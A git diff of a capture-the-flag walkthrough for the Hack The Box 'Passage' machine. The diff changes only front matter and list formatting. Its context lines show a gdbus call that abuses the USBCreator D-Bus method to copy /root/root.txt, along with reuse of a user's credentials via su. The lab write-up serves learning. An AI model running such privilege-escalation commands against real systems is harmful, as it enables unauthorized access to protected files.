@@ -1,7 +1,7 @@
 ---
-layout: single
 title: "Walktrough: HTB Passage"
 namespace: htb-passage
+language: en-US
 category: Walkthrough
 tags:
   - HackTheBox
@@ -181,7 +181,7 @@ After running `linpeas.sh` found some interesting information:
 Vulnerable!!
 ```
 
-  - Besides having this vulnerability in place, when tried to exploit it like explained in [this link](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/) it didn't worked due to lack of permissions, which will probably work with another user.
+- Besides having this vulnerability in place, when tried to exploit it like explained in [this link](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/) it didn't worked due to lack of permissions, which will probably work with another user.
 
 ```bash
 www-data@passage:~$ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/root.txt /tmp/somefilename true
@@ -206,7 +206,7 @@ uid=1000(nadav) gid=1000(nadav) groups=1000(nadav),4(adm),24(cdrom),27(sudo),30(
 uid=1001(paul) gid=1001(paul) groups=1001(paul)
 ```
 
-  - First thing to test is Paul credentials, which worked successfully at first try and allowed us to get the user flag! :smile:
+- First thing to test is Paul credentials, which worked successfully at first try and allowed us to get the user flag! :smile:
 
 ```bash
 www-data@passage:~$ su paul
